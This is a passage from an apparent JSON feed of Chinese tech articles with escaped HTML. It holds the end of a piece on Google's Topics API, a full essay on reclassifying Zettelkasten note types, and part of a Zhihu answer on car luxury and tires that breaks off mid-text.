究竟能为用户的隐私保护带来怎样的变化，一切都需要等到实装之后再下定论。</p>\n<h4>参考文章</h4>\n<ul>\n<li><a href=\"https://blog.google/products/chrome/get-know-new-topics-api-privacy-sandbox/\" target=\"_blank\">Get to know the new Topics API for Privacy Sandbox</a></li>\n<li><a href=\"https://privacysandbox.com/proposals/topics\" target=\"_blank\">Topics API: Relevant Ads without Cookies - The Privacy Sandbox</a></li>\n<li><a href=\"https://developer.chrome.com/docs/privacy-sandbox/topics/\" target=\"_blank\">The Topics API - Chrome Developers</a></li>\n<li><a href=\"https://support.google.com/google-ads/answer/2497941\" target=\"_blank\">受众群体定位简介 - Google Ads帮助</a></li>\n</ul>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66056\" target=\"_blank\">如果不用第三方 Cookie，Google FLoC 会是更好的替代者吗？</a></li>\n<li><a href=\"https://sspai.com/post/44498\" target=\"_blank\">浏览器的隐私模式，真的能完全保护我们的隐私吗？</a></li>\n<li><a href=\"https://sspai.com/post/68666\" target=\"_blank\">都基于 Chromium，它有什么不同：Brave 浏览器简介</a></li>\n<li><a href=\"https://sspai.com/post/68218\" target=\"_blank\">差分隐私是如何保护个人隐私的？</a></li>\n</ul>\n<p>&gt; 下载少数派 iOS <a href=\"http://sspai.com/s/nqQk\">客户端</a>、关注少数派 <a href=\"http://sspai.com/s/KEPQ\">公众号</a>，每天了解科技圈的新鲜事 📰</p>\n<p>&gt; 获取特惠、正版、高品质软件，尽在 <a href=\"https://sspai.com/mall\">少数派数字商城·正版软件</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71372"},{"title":"巧用分类法解决使用卡片笔记时遇到的困境","date":"2022-02-11 06:32:16","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>我们实践卡片笔记法已近两年时间，《<a href=\"https://book.douban.com/subject/30216624/\" target=\"_blank\">How to take smart notes</a>》 一书及中文版<a href=\"https://book.douban.com/subject/35503571/\" target=\"_blank\">《卡片笔记写作法》</a>前前后后也翻了好几遍，也与许多朋友们不断在探讨实践中的收获与困扰。近来，我们反思了自己在实践中遇到的主要困难，相应地调整了自己的笔记类型。我们的新系统更加重视项目笔记和索引笔记，探索实现「自下而上」模式和「自上而下」模式的互动和平衡。本文主要介绍我们近期对建立笔记体系的反思和调整后的基本框架。考虑到篇幅问题，本文分上下两篇，上篇介绍我们对笔记的再分类，下篇介绍笔记间的互动和笔记体系的构建。</p>\n<h2>卡片笔记实践中的三个困境</h2>\n<p>卡片笔记写作法通常以德国社会学教授 Niklas Luhmann 的笔记系统为例，强调卡片式的笔记方法，每条笔记短小而完整，笔记与笔记间充分建立链接。卡片笔记法的核心思想不是记笔记的技巧和窍门，而讲求一套完整的从笔记到写作的流程。卢曼教授将笔记分为闪念笔记（Fleeting notes）、永久笔记（Permanent notes）、文献笔记（Literature notes）、项目笔记（Project notes）和索引笔记（Index）。闪念笔记类似于我们的随手记，需要定期整理成永久笔记，整理后即可销毁。文献笔记记录文献信息和对该文献核心思想的简要总结。永久笔记是卡片笔记的核心，也是写作的基础。索引笔记为这些永久笔记提供检索途径，也有单独的卡片盒保存。项目笔记则记录与具体项目相关的笔记，项目完成后也可以销毁。</p>\n<p>我们在实践初期尽可能安装书中介绍的方式操作，从中不断获益，但也不断遇到了一些困扰，似乎卢曼教授的操作并不完全适合我们的实际需求，主要有以下三大问题。</p>\n<h3>闪念笔记（Fleeting notes）用完就丢弃嘛？</h3>\n<p>《卡片盒笔记写作法》书中强调（p.192）要分清几类笔记，而其中闪念笔记主要是对收集的信息起提醒作用，可以用任何一种方式书写（活页本、便签本，甚至餐巾纸，等等），它们最终会在一两天内被扔进垃圾桶。因为闪念笔记上的内容需要被按一定的标准定期整理成永久笔记，这条永久笔记会被存放在卡片盒中，而作为永久笔记基础的闪念笔记因而就没有保存的必要了。</p>\n<p>我们首先非常认同对笔记的重新整理，闪念笔记捕捉了我们瞬时的想法和灵感，帮我们即时记录下了许多绝妙的思想，但也正因为它们是闪念，因此可能相对零散、不成系统，或者需要更进一步的仔细推敲。同时，重新整理和书写的过程可以加深我们的思考。但是，我们实践中发现有些闪念笔记并非整理成卡片笔记后就没有价值了。比如说，当我们重读一本书时，看到之前留下的批注，可能会激发出新的思考，这种灵感是建立在阅读批注而非原文的基础上。又比如说，我们习惯在读论文的时候用不同的颜色标注不同类型的信息，那么高亮的留存可以让我们在重读时迅速定位信息，也可以帮助自己再次阅读时更快更好地理解文章，或是发现自己之前阅读时存在的问题。</p>\n<p>比如我习惯用黄色标记文章主要观点，用红色标记重要背景知识，用紫色标记与自己想法相关内容，用绿色标记有疑问的地方，用蓝色标记不同意的内容。再次阅读时我可以很快地通过所有标黄部位回顾文章主要内容，再重点关注蓝、紫、绿色标注的部分，看这回阅读是否可以解除一些疑惑，或是对应原文重新检视自己的观点和思路。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/article/cc4c5b88d49d8fa280cdcc4c34119c85\"><figcaption>（图 1 文档阅读分色高亮示例）</figcaption></figure><p>「闪念笔记」可以用完丢弃的另一个重要的理由是文章不会阅读第二次。诚然，很多时候确实如此，但学术研究过程中文章反复阅读却是常态，留下阅读的痕迹并不是无意义的。每次阅读中的随手标记都可以给下次阅读提供一定的信息（当然，随手标注可能也需要一定的系统性，如使用颜色系统，又如也尽量用完整的句子代替关键词，等等）。</p>\n<p>更重要的是，我们认为重读原文和回顾笔记一样重要，对应原文检视自己早先记下的闪念笔记，再去回顾相应的永久笔记可以确保自己的理解更加准确，消除偏差，也可能更容易激发新的想法。换句话说，我们认为尽管有些「闪念笔记」确实可以整理完就丢弃，但有些依旧是可以留存的，保存部分闪念笔记是有价值的。</p>\n<h3>永久笔记(Permanent notes)好像并不永久哦！</h3>\n<p>关于「永久笔记」我们主要有两个困惑，一是卢曼教授系统里的卡片笔记和文献笔记到底如何区分，文献笔记记什么。二是我们的永久笔记似乎很难永久，似乎一直在编辑和调整中。</p>\n<p>先说第一个问题。《卡片笔记写作法》（p.139）中是这样介绍文献笔记（Literature notes）的写法的：</p>\n<blockquote><p>无论你读什么，都要做笔记，写下你不想忘记的内容，或是你认为可能会在自己的思考或写作中使用的内容。<strong>文献笔记要非常简短，精心选择</strong>，并使用自己语言记录，对引文要格外挑剔，不要知识抄写，而不去真正理解其含义，最后把这些笔记和参考书目的细节一起保存在你的文献管理系统中。</p></blockquote>\n<p>我们非常赞同写文献笔记的要义是不要简单地做抄写，而是要用自己的语言转写，努力理解文章内容，带着批判的眼光阅读。用自己的语言、写出完整的句段是我们接触卡片笔记法之后写阅读笔记做出的最大的改变，也从中受益匪浅。但我们的困惑在于文献笔记不一定很简短，笔记内容不仅仅是一篇论文的中心思想，以我自己的研究为例，我要讨论作者论证逻辑是否合理，要讨论作者使用的材料是否有效支持论证，那么在我的笔记中常常会要记录更多的细节性内容，并对其进行评注。这样一来，有时一篇重要文献的篇幅可能会很长。</p>\n<p>其实，长短也不是问题的本质，关键在于这种方式写就的文献笔记是否算作卢曼教授系统中的「永久笔记」呢？我们是否要将二者在系统中区别开来？</p>\n<p>请看下图展示的这个例子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/article/b8d1bb1f25d482e184da02b0f7bfe123\"><figcaption>（图 2 阅读笔记示例）</figcaption></figure><p>我在整理阅读笔记的过程中常常会重新组织笔记内容，不一定按原文的顺序陈列，而是试图将每个要点以一张卡片的模式来写。这么来看，我的一篇文献阅读笔记本质上对应着数条笔记（或者说数张笔记卡片）。比如说图中所展示的这篇阅读笔记实际上包括了五个要点，如两个红框中所示，每个要点下的内容实际上是非常完整的，且可以独立和其他的想法、笔记互动，因此其实每个要点都符合所谓「永久笔记」的要求的。那么现在的问题是，我们是否还需要通过某篇文献把这些卡片单独串联起来？此外，我们是否需要区分以记录他人文章内容为主的卡片和记录以自己想法为主的卡片？</p>\n<p>第二个问题则是一直以来最困扰我们的问题。书中所介绍「永久笔记」的记法似乎非常容易。</p>\n<blockquote>\n<p>打开你的卡片盒，仔细阅读你在第一步或第二步所做的笔记（最好每天一次，以及在你开始遗忘为什么记它之前），并思考它们与你自己的研究、思考或兴趣所在的相关内容有何关联。因为这里面只包含你感兴趣的东西，所以翻阅卡片盒很快就可以完成。这种笔记上的思想不是为了收集，而是为了衍生想法、论点和讨论。新的信息是否与你卡片盒里或脑海里已有的信息相互矛盾、相互一致、相互印证或相互补充？是否能把已有的想法结合起来产生新的想法？这些想法又引发了什么问题？<strong>你可以为每一个想法准确地写下一条笔记，并像为别人写作一样，使用完整的句子，标注来源，提供参考资料，并尽量做到精确、清晰和简短。此时，扔掉第一步的闪念笔记，把第二步的文献笔记放入你的文献管理系统。待所有重要的内容都进入卡片盒后，你就可以忘记它们了。</strong></p>\n<p>(p.141)</p>\n</blockquote>\n<p>初读来就觉得仿佛每天整理完当日的闪念笔记之后，就应当至少能写出一两条永久笔记来。但实际操作过程中却发现，即便已经近两年，自己真正写成的永久笔记数量是非常有限的。如果是在学习新知识，了解新概念和新方法，可以很快地写成一条结构完整、可以独立应用、与其他笔记关联的笔记来。就像下图所展示的对这个术语的理解，除了某篇文献里介绍的定义之外，我又搜集了其他文献中的相关定义，做了简单的梳理，并加上了部分自己的评注，相对来说已经很完整了，我也默认自己很长时间内是不会做出修订的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/article/c4ffcc5838a1e7e6335517a4ec690ffb\"><figcaption>（图 3 永久笔记示例）</figcaption></figure><p>但如果是一条关于自己的新观点笔记似乎就很难成型了。一方面，科研过程中对一个问题的思考通常历时较长，因而似乎总是会不断为某条笔记增加新内容，已经写好的部分也会不断修改、调整，很长时间都难以算作一条真正意义上的「永久笔记」。而另一方面，想法发展到某个程度之后，我们可能就会开始着手写论文草稿了，并不会真的等到笔记完全完善之后才开始写文章。这种情况下，最终真正可以称之为 Zettel 的东西实际上是自己的论文或论文的部分章节。</p>\n<p>从个人经历来看，又常常疏于把成文内容存入笔记体系中。这两方面因素迭加在一起，造成了我的笔记系统里大部分的 zettel 都标记了 #budding 或者 #to develop 之类的标签。比如说下图所示的一条笔记，本身是有明确的论点的，可以作为一条永久笔记。但是每一个小点又涉及到更多的内容需要不断补充、论证。似乎只有等到每个小点都落实之后才能把这一条笔记最终完善，这一过程可能需要数月甚至数年。于是，我们也有很长一段时间在纠结，或许对于我们这使用需求来说，「永久笔记」就是一个不可实现的梦想，不如以「永久笔记」的写作要求来写，统一看作自己的灵感库。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/article/d82cf63a6f5228d629ec3e07d4fe5bef\"><figcaption>（图 4 类永久笔记示例）</figcaption></figure><h3>项目笔记（Project notes）不重要吗？</h3>\n<p>在实践中我们另一个困惑是关于项目管理相关的笔记。在《卡片笔记写作法》第一章通过讨论撰写论文的步骤来介绍了不同类型笔记（p.138-146），此处并未谈及「项目笔记」。在第二章介绍要区分三类笔记时（p.192-193），仅简单提及「[项目笔记]只与某一特定项目有关，保存在特定项目的文件夹内，项目结束后即可丢弃或存档」。除此以外，在目前可见关于卡片笔记或任何笔记法的介绍与讨论中涉及项目笔记的相关内容也都非常少。那项目笔记到底记什么呢？又该怎么管理呢？</p>\n<p>之前，我们一直笃信不要强求 all-in-one，建立合理的工作流更重要。但因为我们日常任务并不太繁琐，主要也就围绕读文献、写笔记、想问题，内心总有一丝期待，希望能将任务管理和知识管理二合一。</p>\n<p>更重要的是，以<a href=\"https://sspai.com/u/dt99zq6z/updates\" target=\"_blank\">心安</a>的研究为例，若日常涉及许多实验，每个实验可以看作一个项目，相关笔记中涉及大量的设计思路、实验材料、失败经验等等，这些也都是可以应用到之后的项目中的。此外，近年来重复实验、复制实验结果也越来越受到学界重视，需要我们长期保存并公开全部相关材料，因此也需要我们做好整理汇总工作。因此，与项目相关的笔记在我们实际使用中是非常重要的，也绝不是项目结束后就可以丢弃的。这种情况下对项目笔记就有很大的需求，我们到底该如何处理呢？</p>\n<h2>笔记的再分类</h2>\n<p>基于对上述几个问题的考虑，我们认为或许不必拘泥于书中所介绍的笔记分类方式或处理方式，每个人都可以在把握了卡片笔记写作法核心要义的基础上，根据自己的实际情况和需要灵活作出调整。我们目前将整理过的涉及各类内容的笔记全部看作「永久笔记」，包括记录他人观点为主的阅读笔记，发展自己观点为主的 Zettel，以及记录了一些操作技巧、代码、范式等的「工具笔记」。同时，我们自己的日常使用中会更加重视项目笔记和索引笔记的使用，通过项目笔记来串联笔记、辅助写作，通过索引笔记来组织自己知识体系的结构。各类笔记间的互动我们在下篇介绍，这里先简单介绍一下我们现行笔记体系中对笔记的分类方式。</p>\n<p>书中所介绍的卢曼教授的笔记分类包括闪念笔记、文献笔记、永久笔记、项目笔记和索引笔记。但如果我们细想一下，这个分类其实并不是在一个维度上的，比如说闪念笔记和永久笔记是从笔记的保存时间或笔记状态上来看的，文献笔记是从笔记的内容来看的，项目笔记和索引笔记是从笔记的功能来看的。那么，以文献笔记为例，顾名思义，文献笔记就是阅读文献时所做的笔记，自然文献笔记可以有闪念的部分，也可以有永久的部分，也可以有自己的项目管理（如写一篇文献综述或项目申报书）及索引系统。因此，我们的再分类将不同的维度区分开来，如下表所示。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td> </td>\n<td>闪念笔记</td>\n<td>永久笔记</td>\n<td>索引笔记</td>\n</tr>\n<tr>\n<td>知识输入</td>\n<td>文献阅读批注、高亮等</td>\n<td>文献笔记</td>\n<td>文献笔记索引</td>\n</tr>\n<tr>\n<td>灵感与思考</td>\n<td>灵感捕捉</td>\n<td>Zettel</td>\n<td>Zettel 索引</td>\n</tr>\n<tr>\n<td>工具箱</td>\n<td>随手记</td>\n<td>工具笔记</td>\n<td>工具箱索引</td>\n</tr>\n<tr>\n<td>项目管理</td>\n<td>任务管理</td>\n<td>项目笔记</td>\n<td>项目索引</td>\n</tr>\n</tbody></table></figure><p>首先，我们根据内容区分开，如下表第一栏中四行所示。</p>\n<p>其次，我们根据笔记管理的步骤区分，如下表第一行中右侧三栏所示。首先，闪念笔记和永久笔记不看作具体的笔记类型，而看作记笔记的两个阶段，通常先有相对零散、即时的闪念笔记，再有整理过后的永久笔记，成为留存在笔记系统中的核心内容。索引笔记是我们积累了永久笔记之后进行笔记管理的重要一步，它本身通常并不涉及具体的笔记内容，而是对我们笔记库中的笔记卡片做的目录，那么自然，任意内容的永久笔记都可以建立相应的索引。简单说来，我们把内容相关的分类和管理相关的分类看作两个不同的维度，二者不是并举关系，而是可以搭配组合。闪念--永久--索引的路径基本适用于所有人，而内容相关的分类大家需要根据自己的实际使用情况和需求调整，合并、拆分上述项目或增设不同内容类型的笔记。</p>\n<h3>笔记内容四大类</h3>\n<p>我们根据自己的需求从内容的角度分类四类，包括：</p>\n<ol>\n<li>学到的新知识，即「知识输入」；</li>\n<li>自己的思考与观点，即「灵感与思考」；</li>\n<li>辅助写作或工作、生活的实操性知识，即「工具箱」。</li>\n<li>项目管理相关资料。</li>\n</ol>\n<p>其中，「知识输入」部分在卢曼教授的体系中可能部分对应文献笔记中的小结部分，部分算作 Zettel；「灵感与思考」对应卢曼教授体系中的永久笔记，或者说 Zettel。「工具箱」部分在卢曼教授的体系中没有具体提及。「项目管理相关资料」对应卢曼教授体系中的项目笔记。</p>\n<p>我们将以总结他人观点为主的文献笔记和发展自己观点为主的 Zettels 区分开来，主要出于两点考虑。一是为了方便项目管理和建立相关索引，具体操作我们将在「索引篇」谈。简单说就是我们在写文章的时候要区分对他人观点的述评和对自己观点的阐释，那么在笔记系统里也可以先做个对应的分类。二是既然为了方便引用会为参考文献单独建立页面，不如在该页面下汇总相应的所有阅读笔记，我们从汇总后的阅读笔记中有所受益。</p>\n<p>如果我们论文常常不止看一遍，阅读笔记也同样会反复阅览，我们前面提到重读论文时一些即时的高亮和批注可以帮助我们快速掌握信息、加深理解，那么一篇认真写就，结构完整、细节丰富的阅读笔记同样可以帮助我们更好地回顾和把握论文内容，做到有的放矢，增加重读的意义。</p>\n<p>「工具箱」的内容可能比较明确，对我们来说就是某些软件的操作指南，常用代码等等，每个人需要的工具可能类型不同、数量不同，是否需要此类笔记因人而异，本文也就不再赘述。</p>\n<p>最后简单谈一下「项目管理」笔记，我们为什么要强调笔记体系中这一项的重要性也会在「索引篇」着重讨论。简单说来，在思考笔记再分类的过程中我们重新认识了「项目」，其实我们想写的每一个小论文，或是每一个小实验，想解决的每一个问题都对应着一个项目。为这个项目看的文献，思考的点点滴滴，开展的讨论，要做的各种事情如果集中汇总在一起，管理起来也更方便。总之，我们记笔记的根本目的还是为了帮助思考问题，帮助写作。此处，我们需要澄清一个小点，这里我们所说的笔记系统里增加「项目管理」笔记不等同于任务管理体系和笔记体系完全二合一，我们依然坚持两个系统有其分开处理的必要性，这一点之后也将专文讨论。</p>\n<h3>笔记管理三步走</h3>\n<p>对于内容的分类，每个人的需求不尽相同，我们提倡每个人寻求最适合自己的分类方式，不要拘泥于典型分类。而笔记管理的步骤不仅适用于不同内容类型的笔记，也应该适用于每一个人。其实，卡片笔记写作法一直在强调，这不是具体的笔记技巧或窍门，它的核心其实是整套工作流。建立这套工作流也是我们践行卡片笔记写作法中最深刻的感触和最大的收获。首先，我们要定期整理自己的所谓「闪念笔记」，用完整的语言写出来，即制作「永久笔记」。其次，我们要不断思考、建立笔记间的关联，设计合理的索引。</p>\n<p>在日常生活和工作中，我们可能时常有一些临时的备忘或灵感需要记录下来，这些都是「闪念笔记」，记录的方式和工具通常需要因地制宜，有时记在手机上，有时可能写在随身笔记本上，有时可能随手找到一个什么纸就写了。这些笔记虽然帮助我们即时捕捉到了当下的信息和灵感，但它们是分散的，未加工的，不能直接用于写作。因此，我们需要对其进行进一步汇总和加工整理，更好地发挥这些信息和灵感的作用。这种整理的过程并非只适用于某一些特定内容的笔记，实际上各种记录都可以做重新书写和整理。</p>\n<p>再提一点「永久」这个问题，《How to take smart notes》书中用了 permanent notes 这个术语，中文版则相应地译作「永久笔记」。我们觉得可能 <a href=\"https://andymatuschak.org/\" target=\"_blank\">Andy Matuschak</a> 所提出的<a href=\"https://notes.andymatuschak.org/Evergreen_notes\" target=\"_blank\">长青笔记（evergreen notes</a>）这一个概念更为贴切，即这条笔记是可以不断修改、调整，并非一次写就之后就永久留存不再改动的了，而且这条笔记也可以不断与其他笔记关联、链接，发挥作用，在整个知识库中生生不息，长青不衰。如此想来之后，我们也就不再纠结所谓Zettel是否还会不断修改了。</p>\n<p>当我们的永久笔记越写越多，关联建立得越来越繁复，我们产生了更多的想法，但也很容易失陷在复杂的知识网络中，这时候一个清晰的索引可以帮助我们梳理笔记间的结构化关系，也可以帮助我们更容易检索笔记。卡片笔记法强调开始写笔记的时候不要分类，不要强行建立系统结构，因为其实当我们对问题认识还不够清晰时建立的系统一定是不完善的，坚守这个系统反而会限制我们的思考，带来不必要的麻烦。但卡片笔记法也并非要求完全放弃结构，比如说卢曼教授就有一个专门的索引笔记卡片盒，针对不同话题都建立了相应的索引。其实，关键是不要着急分类，而不是不分类，建立结构和索引是有帮助的。</p>\n<p>因此，我们将笔记管理流程分为三步，第一步是多途径搜集「闪念笔记」，第二步是整理、汇总「闪念笔记」，深入思考，形成「永久笔记」，第三步是笔记积累到一定程度之后建立「索引笔记」，帮助梳理个人知识系统结构。</p>\n<h2>结语</h2>\n<p>这样重新分类不仅解决了我们的困扰，也让我们对笔记系统的认识更加清楚了。其实整个系统的要义还是在于</p>\n<ol>\n<li>及时记录「闪念笔记」；</li>\n<li>定期整理、完善，形成「永久笔记」；</li>\n<li>重视笔记间的链接，设计合理的「索引笔记」。</li>\n</ol>\n<p>而由于每个人的使用场景都不尽相同，适合一个人的系统和分类未必适合每一个人，哪怕只对某一个人来说，适合某个阶段或某种需求的方式未必适合所有的场景。卡片笔记写作法对卡片的分类有其独到之处，但任何体系都不可能是适用所有人的。因此，我们需要根据自己的实际情况和需求来重新分类，在实际使用中勤思考、多尝试、多调整，找到最适合自己的分类方式。</p>\n<p>【注：本文所用的引用页码为《卡片笔记写作法》一书中文版在「微信阅读」ipad 端显示的页码。】</p>\n<p> </p>\n","link":"https://sspai.com/post/71274"},{"title":"是什么决定了汽车的「豪华感」？","date":"2022-02-11 03:59:19","description":"\n<p data-pid=\"kV4asUIZ\">谢邀。</p>\n<p data-pid=\"3XMWfz0c\">私以为：“豪华感”其实是一种“隔绝感”，把你和整个外界环境做出“适当”的隔绝，让你能感受到很自我的舒适和自在。</p>\n<p><br></p>\n<p data-pid=\"_vLtP8Pk\"><b>1、从感官上一条一条说：</b></p>\n<p data-pid=\"LrAhLsNT\">视觉上：</p>\n<p data-pid=\"I8jjpt1A\">按照传统定义的汽车内饰豪华：木纹和真皮的使用，造型的环抱感，电动遮阳帘，都是在模仿室内环境（当然可以理解是传统的西方室内环境），让人觉得进入车里就是私人的小空间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-52417485b6eab6d16b2c6193e0e114a3_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1231\" data-rawheight=\"395\" data-watermark=\"watermark\" data-original-src=\"v2-52417485b6eab6d16b2c6193e0e114a3\" data-watermark-src=\"v2-1c2cfcac746db720db0af6c6f343d6dc\" data-private-watermark-src=\"v2-e46298432e739bf7fec582a490348d80\"></p>\n<p data-pid=\"YlKOJ6hZ\">触觉上：</p>\n<p data-pid=\"0e6GNx-8\">舒服的座椅、细腻的纹理，特别决定内饰的豪华感。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-943b611969ac9a7077d9b84aefffba85_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"567\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"4haJ1wz-\">传统豪华品牌奔驰深谙此道，比如W221的奔驰S65 AMG在转弯时主动充气拖住的腰托，比如S级后排和被戏称为“D罩杯”的舒适头枕，比如内饰旋钮按键的阻尼感和亲肤感，都是在提供适度的“隔绝”与“缓冲“。</p>\n<p data-pid=\"lYVYJASu\">再比如魔毯主动悬架技术、悬架里轴向和径向刚度不同的橡胶衬垫、匹配更舒适而静音的轮胎——是在行驶途中，隔绝环境造成的颠簸，给你一个自在的“小环境”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9ee9c0acb3e517bb7d230f4c7e1e2489_720w.jpg?rss\" data-caption=\"（魔毯主动悬架，预先扫描前方路段的起伏，主动悬架去抵消这些起伏，使车内乘员感觉不到颠簸）\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"232\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"XCngzrJo\">听觉上：</p>\n<p data-pid=\"InxPTW3v\">听觉上也是如此，噪音控制是豪华车型重要的一环，汽车厂商也是在此各种花心思，比如大面积的吸音材料、双层玻璃、主动降噪音响、发动机静音技术、静音轮胎——甚至是取消掉噪音最大的来源发动机：纯电车在静谧性方面也有得天独厚的先天优势。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6cd7434d75e94bb8da5b1ab4b0806e33_720w.jpg?rss\" data-caption=\"（车内主动降噪：在人耳高度上设置检测麦克，并识别收集噪音信号回传给车载主机处理，主机接受并且分析噪音信号后，通过车内扬声器发出一个噪音抵消声波，尽可能的把噪音抵消降低。）\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"485\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b6cc27256fa0cc51d0a83a7a14a454ea_720w.jpg?rss\" data-caption=\"（静音轮胎：比如上图里德国马牌ContiSilent静音轮胎，除了专门设计的轮胎花纹之外，内壁上包含了聚醚型聚氨酯泡沫隔层。该隔层通过粘合层被粘于胎面内表面，不影响驾驶性能、续航、负重和最高速度，可将车内的路面噪音最高减少9分贝。好的NVH对车内豪华感的提升会相当明显。）\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"457\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"cNyb5iD1\">2、</p>\n<p data-pid=\"ofGIViEo\">平顺性、静谧性、豪华感，都提到了轮胎——作为车辆唯一和路面接触的部件，轮胎的重要经常被车主低估。</p>\n<p data-pid=\"zxvJKnde\">轮胎有多重要呢，在赛道里轮胎对圈速的影响简直可以说是决定性的。</p>\n<p data-pid=\"qtxMQbgX\">在锐思的1min前后的小赛道，bmw M2C换了套轮胎就能进步1s+。同样在这条小赛道，前两天鲁超教主测吉利星越L 1:02.61的圈速成绩，完虐了原厂宝马325（1:03.28）。我去吃瓜问“你这是不是被充值了”，他说圈速成绩绝对真实，只是吉利的胎比325用的轮胎级别高出好几级。在赛道里轮胎的差别比车本身的差别还要大，不同轮胎甚至可以理解为大家进行的不是同一个项目的比试了。</p>\n<p data-pid=\"bmidlABj\">所以，有改装想法、且不满足于“气氛组”和“唇上马力”改装的，不妨先从轮胎开始。</p>\n<p data-pid=\"Of9SZNKT\">如果你已经选定了一款车型，设计用料做工你都改变不了、改装悬架和加装隔音材料都是大工程，你还有一个选择可以快速有效的提升豪华感：换一款更适合的轮胎。</p>\n<p data-pid=\"6SYIImBU\">在日常驾驶中，轮胎对行驶品质的影响同样是决定性的。这在刚刚更换一套新胎之后会感觉十分明显。</p>\n<p data-pid=\"SiFtZ8i1\">豪华车型会匹配高端轮胎来保持自己的性能和行驶品质，可以说是“好马配好鞍”。而现在很多国产品牌的高端车型其实也会选择更好、更高端的轮胎。比如WEY VV7、汉DM、领克03+、蔚来ES8这些品牌的高端车型都选择了德国马牌MC6作为原厂轮胎。想想看一台车多加个大几百或小几千，提升的行驶品质和性能可能要跨越一个车型level了，这是多高的高性价比！</p>\n<p data-pid=\"lbqjgvtJ\">反倒是有些合资品牌舍不得原厂配好胎，车主朋友们在换新胎的时候真的可以好好研究一下，不用迷信原厂型号。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-130266e50cb53021bdd3ad3a25c7585a_720w.jpg?rss\" data-caption=\"（比如：劳斯莱斯幻影上标配的马牌CSC 5，主要特点包括：高性能的抓地和操控、短制动距离、低滚阻提升续航、非对称花纹降低胎噪。）\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"547\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"DffvIUOg\">轮胎真是个很神奇的存在，写此文的时候随手百度了马牌轮胎历史，感触颇多，几小故事来充当一下今天的冷知识环节：</p>\n<p data-pid=\"r7MlE1Nv\">比如：橡胶充气轮胎的发明甚至比汽车更早！</p>\n<p data-pid=\"wuFQqzTB\">1885年卡尔·奔驰造出来世界上第一台汽车。到1901年第一辆被命名为“梅赛德斯·奔驰”的汽车装配的充气轮胎来自德国马牌。而马牌轮胎早在1871年就已经在德国汉诺威诞生。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-30e9f07bdbc4eaaa26ee173c3241fec7_720w.png?rss\" data-caption=\"（德国马牌轮胎以马蹄缓冲垫起家，所以LOGO是马的形状。轮胎初期的LOGO，1875年的LOGO，和今天的德国马牌LOGO）\" data-size=\"normal\" data-rawwidth=\"1084\" data-rawheight=\"375\" data-watermark=\"watermark\" data-original-src=\"v2-30e9f07bdbc4eaaa26ee173c3241fec7\" data-watermark-src=\"v2-d674bd362c2a066239c4aa75c3fbd7b0\" data-private-watermark-src=\"v2-09f43bb5e632c03c6b53f3d1b5e4e44e\"></p>\n<p data-pid=\"PHKo09i0\">1904年德国马牌发明了有花纹的轮胎，大大提升了抓地、静音、防滑等各种性能。次年，又推出了带有铆钉的橡胶轮胎。后来各大轮胎公司加入了对提升汽车性能的探索，参加了各种汽车比赛。比如奔驰车队使用德国马牌的轮胎获得多次冠军，这份姻缘一直延续。</p>\n<p data-pid=\"PlJEvckX\">1910年，在轮胎生产中开始使用炭黑作为补强填充剂，增加了轮胎的耐磨和抗老化性——所以轮胎都是黑的。</p>\n<p data-pid=\"YsLqmcBP\">1952年，为适应欧洲冬季的酷寒气候环境，发明了М+S（泥泞+雪地）轮胎</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6910dcbc765c58723ea4fdb6c9caf53c_720w.jpg?rss\" data-caption=\"1952年马牌M+S（泥泞+雪地）轮胎的宣传广告\" data-size=\"small\" data-rawwidth=\"863\" data-rawheight=\"1219\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"91XQvUUM\">同年，德国马牌的德国研发中心发明了世界第一条缺气保用轮胎SSR，就是我们现在俗称的防爆胎：为了避免爆胎并能在轮胎失压后继续安全行驶一段距离。一般以SSR和ROF作为标志。这种轮胎能在完全漏光气的情况下，仍然能以不超过80公里/小时的正常时速安全行驶80公里左右。SSR第一次作为原厂轮胎是2003年的宝马，这个传统沿用至今——省却了一条备胎的重量、空间和成本。</p>\n<p 